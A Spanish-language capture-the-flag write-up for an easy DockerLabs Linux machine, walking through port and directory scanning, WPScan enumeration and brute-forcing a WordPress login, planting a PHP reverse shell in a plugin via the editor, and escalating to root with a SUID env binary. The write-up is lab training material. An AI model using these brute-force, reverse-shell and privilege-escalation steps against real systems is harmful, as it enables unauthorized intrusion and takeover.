---
Estado: Completado
Plataforma: DockerLabs
SO: Linux
Dificultad: Facil
VectorInicial: WordPress login + plugin edit RCE
Privesc: SUID env
Fecha: 2026-02-16
---
<img width="911" height="510" alt="Pasted image 20260216150558" src="https://github.com/user-attachments/assets/7a2d1195-dd1e-40d0-aa99-65f15b273945" />

Para empezar realizaremos un reconocimiento para ver que podemos encontrar.

```bash
 settarget 172.17.0.2                                              
TARGET establecido: 172.17.0.2

 gomap -s $TARGET                                                                                                         
🎯 Scanning 172.17.0.2 (997 ports)

 PORT    STATE  SERVICE      VERSION
80 open http Apache 2.4.57 (Debian)
```

Tenemos un servicio corriendo en el puerto 80 bajo un apache, pero en la raíz únicamente encontramos la página por defecto de Apache, por lo que procederemos a realizar enumeración de directorios.

```bash
 dirb http://$TARGET                                                                                          

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Feb 16 15:13:50 2026
URL_BASE: http://172.17.0.2/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://172.17.0.2/ ----
+ http://172.17.0.2/index.html (CODE:200|SIZE:10701)                                                                                                       
+ http://172.17.0.2/server-status (CODE:403|SIZE:275)                                                                                                      
==> DIRECTORY: http://172.17.0.2/wordpress/                                      

---- Entering directory: http://172.17.0.2/wordpress/ ----
+ http://172.17.0.2/wordpress/index.php (CODE:301|SIZE:0)                                                                                                  
==> DIRECTORY: http://172.17.0.2/wordpress/wp-admin/                                                                                                       
==> DIRECTORY: http://172.17.0.2/wordpress/wp-content/                                                                                                     
==> DIRECTORY: http://172.17.0.2/wordpress/wp-includes/                                                                                                    
+ http://172.17.0.2/wordpress/xmlrpc.php (CODE:405|SIZE:42)    

<snip>
```

Estamos frente a un Wordpress en una carpeta distinta al raíz, así que vamos a explorar la web a ver si encontramos algo interesante.

Solo encontramos en una publicación el usuario **mario** así que usaremos una herramienta para ver si encontramos mas información.

```bash
 wpscan --url http://$TARGET/wordpress/ -e u,p --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://172.17.0.2/wordpress/ [172.17.0.2]
[+] Started: Mon Feb 16 15:28:03 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.57 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 
 <snip>
 
 [i] Plugin(s) Identified:

[+] akismet
 | Location: http://172.17.0.2/wordpress/wp-content/plugins/akismet/
 | Last Updated: 2025-11-12T16:31:00.000Z
 | Readme: http://172.17.0.2/wordpress/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.6
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://172.17.0.2/wordpress/wp-content/plugins/akismet/, status: 200
 |
 | Version: 5.3.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://172.17.0.2/wordpress/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://172.17.0.2/wordpress/wp-content/plugins/akismet/readme.txt

[+] theme-editor
 | Location: http://172.17.0.2/wordpress/wp-content/plugins/theme-editor/
 | Last Updated: 2025-10-16T11:21:00.000Z
 | Readme: http://172.17.0.2/wordpress/wp-content/plugins/theme-editor/readme.txt
 | [!] The version is out of date, the latest version is 3.1
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://172.17.0.2/wordpress/wp-content/plugins/theme-editor/, status: 200
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: Theme Editor < 2.9 - Authenticated (Admin+) PHAR Deserialization
 |     Fixed in: 2.9
 |     References:
 |      - https://wpscan.com/vulnerability/d366e078-4573-417b-b4f7-5d1d07949894
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-2440
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/88fe46bf-8e85-4550-92ad-bdd426e5a745
 |
 | [!] Title: Theme Editor < 3.1 - Cross-Site Request Forgery to Remote Code Execution
 |     Fixed in: 3.1
 |     References:
 |      - https://wpscan.com/vulnerability/9b47d668-3a8f-4d56-9a21-83a2e992430d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-9890
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/77189684-b794-41a0-8fc0-3320032c2f69
 |
 | Version: 2.8 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://172.17.0.2/wordpress/wp-content/plugins/theme-editor/readme.txt

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==============================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] mario
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://172.17.0.2/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 
 <snip>
```

En tema de usuarios vemos que solo existe el mismo que encontramos antes, **mario**, pero si vemos que hay un pluging vulnerable llamado ***theme-editor***.

Pero intentaremos encontrar primero el acceso del usuario *mario*.

```bash
 wpscan --url http://$TARGET/wordpress/ -U mario --passwords /usr/share/wordlists/rockyou.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

<snip>

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - mario / love                                                                                                                                    
Trying mario / love Time: 00:00:03 < 

<snip>
```

Con estos datos entraremos al panel de control de Wordpress.

Una vez dentro nos dirigiremos al plugin vulnerable que encontramos antes para inyectar código y conseguir una revershell.

<img width="1899" height="857" alt="Pasted image 20260216160309" src="https://github.com/user-attachments/assets/fed97b08-559b-45aa-bda4-d053a5057e63" />

Usaremos el código PHP de Pentestmonkey's reverse shell y nos pondremos a la escucha.

```bash
 penelope -p 443    
[+] Listening for reverse shells on 0.0.0.0:443 →  127.0.0.1 • 10.0.11.3 • 172.17.0.1
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from cf97ec34ece9~172.17.0.2-Linux-x86_64 😍️ Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[!] Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY
[+] Attempting to spawn a reverse shell on 172.17.0.1:443
[+] Got reverse shell from cf97ec34ece9~172.17.0.2-Linux-x86_64 😍️ Assigned SessionID <2>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/script! 💪
[+] Interacting with session [2], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/jduran/.penelope/sessions/cf97ec34ece9~172.17.0.2-Linux-x86_64/2026_02_16-16_05_00-759.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[+] Shell upgraded successfully using /usr/bin/script! 💪
www-data@cf97ec34ece9:/$ 
```

Ya estamos dentro de la maquina, ahora solo nos queda aumentar nuestros privilegios.

```bash
www-data@cf97ec34ece9:/$ find / -perm -4000 2>/dev/null
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/env
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/chfn
```

En este caso encontramos un **SUID** para **env**, así que buscaremos en la web de GTFOBINS la forma de usarlo para convertirnos en *root*

```bash
www-data@cf97ec34ece9:/$ env /bin/sh -p
# whoami
root
```

Y con este ultimo paso ya somos administradores del sistema.

Aunque el plugin theme-editor presenta vulnerabilidades conocidas, en este caso no fue necesario explotarlas directamente, ya que conseguimos acceso como administrador mediante credenciales débiles y pudimos modificar el código del plugin para obtener ejecución remota de comandos.
